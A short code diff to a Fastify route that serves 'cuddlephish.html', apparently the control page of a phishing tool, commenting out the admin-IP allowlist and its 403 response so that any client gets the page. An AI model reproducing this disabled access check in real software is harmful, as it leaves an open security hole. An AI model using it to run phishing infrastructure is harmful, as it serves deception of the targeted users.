@@ -59,12 +59,12 @@ fastify.route({
   handler: async function (req, reply) {
     let client_ip = req.headers['x-real-ip']
     console.log('client_ip: ' + client_ip)
-    if(config.admin_ips.includes(client_ip)){
+    //if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
       reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)))
-    }else{
-      reply.type('text/html').send("403")
-    }
+    //}else{
+    //  reply.type('text/html').send("403")
+    //}
   }
 })
 
